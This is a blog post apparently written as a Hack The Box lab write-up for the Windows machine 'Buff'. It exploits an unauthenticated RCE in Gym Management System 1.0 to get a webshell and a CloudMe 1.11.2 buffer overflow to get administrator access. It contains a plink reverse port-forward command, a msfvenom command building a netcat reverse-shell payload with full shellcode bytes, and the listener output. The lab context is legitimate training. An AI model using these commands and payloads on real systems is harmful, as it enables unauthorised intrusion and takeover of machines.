---
layout: post
title: Hack the Box - Buff
date: 2020-08-01 21:45:22 +0100
description: Buff is an easy difficulty Windows machine that features an instance of Gym Management System1.0. This is found to suffer from an unauthenticated remote code execution vulnerability.Enumeration of the internal network reveals a service running at port 8888. The installation file for this service can be found on disk, allowing us to debug it locally. We can perform port forwarding in order to make the service available and exploit it.
img: buff.png
fig-caption: Buff
categories: HackTheBox
tags: [Easy, Windows, Retired, CVE]
---
## Overview
Buff is an easy difficulty Windows machine that features an instance of Gym Management System1.0. This is found to suffer from an unauthenticated remote code execution vulnerability.Enumeration of the internal network reveals a service running at port 8888. The installation file for this service can be found on disk, allowing us to debug it locally. We can perform port forwarding in order to make the service available and exploit it.
## Enumeration
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/buff]
└─$ sudo nmap -p- -T4  10.129.25.107 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-22 10:57 GMT
Nmap scan report for 10.129.25.107
Host is up (0.022s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE
7680/tcp open  pando-pub
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 88.03 seconds
```
After port scanning we could see an http server running on port 8080. When poking about the website on that port we could see the application version on the contact us page. When searching for exploits for that application on exploitdb we found an unauthenticated RCE exploit.
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/buff]
└─$ searchsploit gym management   
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
Gym Management System 1.0 - 'id' SQL Injection                                     | php/webapps/48936.txt
Gym Management System 1.0 - Authentication Bypass                                  | php/webapps/48940.txt
Gym Management System 1.0 - Stored Cross Site Scripting                            | php/webapps/48941.txt
Gym Management System 1.0 - Unauthenticated Remote Code Execution                  | php/webapps/48506.py
----------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
## Foothold
Gaining a foothold was simple enough once we have the exploit, as shown below.
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/buff]
└─$ python exploit.py http://10.129.117.177:8080/
            /\
/vvvvvvvvvvvv \--------------------------------------,
`^^^^^^^^^^^^ /============BOKU====================="
            \/

[+] Successfully connected to webshell.
C:\xampp\htdocs\gym\upload> whoami
�PNG
�
buff\shaun
```

## Privilege Escalation
Once we have the foothold to escalate privileges was a little more in depth. First we found a binary in shauns download folder.
```
C:\Users\shaun>tree /f
tree /f
Folder PATH listing
Volume serial number is A22D-49F7
C:.
����3D Objects
����Contacts
����Desktop
�       user.txt
�       
����Documents
�       Tasks.bat
�       
����Downloads
�       CloudMe_1112.exe
```
Googling the service we find it listens on port 8888. When checking for open ports we find it open.
```
C:\xampp\htdocs\gym\upload>netstat -ano
netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       956
...
  TCP    127.0.0.1:8888         0.0.0.0:0              LISTENING       5640
```
I found a number of exploits for this service, but decided to go with the first one.
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/buff]
└─$ searchsploit cloudme                                                                                       255 ⨯
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
CloudMe 1.11.2 - Buffer Overflow (PoC)                                             | windows/remote/48389.py
CloudMe 1.11.2 - Buffer Overflow (SEH_DEP_ASLR)                                    | windows/local/48499.txt
CloudMe 1.11.2 - Buffer Overflow ROP (DEP_ASLR)                                    | windows/local/48840.py
Cloudme 1.9 - Buffer Overflow (DEP) (Metasploit)                                   | windows_x86-64/remote/45197.rb
CloudMe Sync 1.10.9 - Buffer Overflow (SEH)(DEP Bypass)                            | windows_x86-64/local/45159.py
CloudMe Sync 1.10.9 - Stack-Based Buffer Overflow (Metasploit)                     | windows/remote/44175.rb
CloudMe Sync 1.11.0 - Local Buffer Overflow                                        | windows/local/44470.py
CloudMe Sync 1.11.2 - Buffer Overflow + Egghunt                                    | windows/remote/46218.py
CloudMe Sync 1.11.2 Buffer Overflow - WoW64 (DEP Bypass)                           | windows_x86-64/remote/46250.py
CloudMe Sync < 1.11.0 - Buffer Overflow                                            | windows/remote/44027.py
CloudMe Sync < 1.11.0 - Buffer Overflow (SEH) (DEP Bypass)                         | windows_x86-64/remote/44784.py
----------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
To ensure we could interact with it I set up port forwarding using plink.
```
C:\xampp\htdocs\gym\upload>echo y | plink.exe -l temp -pw temp -P 2222 -R 8123:127.0.0.1:8888 10.10.14.27
```
The only change we needed to make in the exploit was set up the payload, so I generated one using msfvenom.
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/buff]
└─$ msfvenom -a x86 -p windows/exec CMD="C:\xampp\htdocs\gym\upload\nc.exe -nv 10.10.14.27 4520 -e cmd.exe" -b '\x00\x0A\x0D' -f python
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 277 (iteration=0)
x86/shikata_ga_nai chosen with final size 277
Payload size: 277 bytes
Final size of python file: 1361 bytes
buf =  b""
buf += b"\xb8\x46\xbb\xcd\xed\xdb\xcc\xd9\x74\x24\xf4\x5a\x31"
buf += b"\xc9\xb1\x3f\x31\x42\x14\x03\x42\x14\x83\xc2\x04\xa4"
buf += b"\x4e\x31\x05\xaa\xb1\xca\xd6\xca\x38\x2f\xe7\xca\x5f"
buf += b"\x3b\x58\xfa\x14\x69\x55\x71\x78\x9a\xee\xf7\x55\xad"
buf += b"\x47\xbd\x83\x80\x58\xed\xf0\x83\xda\xef\x24\x64\xe2"
buf += b"\x20\x39\x65\x23\x5c\xb0\x37\xfc\x2b\x67\xa8\x89\x61"
buf += b"\xb4\x43\xc1\x64\xbc\xb0\x92\x87\xed\x66\xa8\xde\x2d"
buf += b"\x88\x7d\x6b\x64\x92\x62\x51\x3e\x29\x50\x2e\xc1\xfb"
buf += b"\xa8\xcf\x6e\xc2\x04\x22\x6e\x02\xa2\xdc\x05\x7a\xd0"
buf += b"\x61\x1e\xb9\xaa\xbd\xab\x5a\x0c\x36\x0b\x87\xac\x9b"
buf += b"\xca\x4c\xa2\x50\x98\x0b\xa7\x67\x4d\x20\xd3\xec\x70"
buf += b"\xe7\x55\xb6\x56\x23\x3d\x6d\xf6\x72\x9b\xc0\x07\x64"
buf += b"\x44\xbd\xad\xee\x69\xaa\xdf\xac\xe7\x2d\x6d\xcb\x4a"
buf += b"\x2d\x6d\xd4\xfa\x45\x5c\x5f\x95\x12\x61\x8a\xd1\xec"
buf += b"\x2b\x97\x70\x64\xf2\x4d\xc1\xe9\x05\xb8\x06\x17\x86"
buf += b"\x49\xf7\xec\x96\x3b\xf2\xa9\x10\xd7\x8e\xa2\xf4\xd7"
buf += b"\x3d\xc3\xdc\x9b\xfb\x67\xa7\x7a\x91\xe7\x27\x21\x01"
buf += b"\x73\xac\xb6\xb2\x08\x70\x2e\x4c\x83\xd4\xc5\xde\x37"
buf += b"\x8a\x44\x7b\x9b\x3a\xe4\xad\x46\xbb\x8f\x91\xa5\x55"
buf += b"\x26\xf2\x84\x99\xe8\xc3\xd6\xf7\xc5\x17\x38\x3a\x11"
buf += b"\x78\x70\x0f\x6f\x48\x58\x42\xea\x88\xfb\xf1\x90\xe6"
buf += b"\x9e\x71\x3c\xf7"
```
Then after placing it in the script and as long as I have a netcat listener open, executing the script should return a shell.
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/buff]
└─$ python buff.py

┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/buff]
└─$ nc -nlvp 4520
listening on [any] 4520 ...
connect to [10.10.14.27] from (UNKNOWN) [10.129.117.177] 49701
Microsoft Windows [Version 10.0.17134.1610]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
buff\administrator
```
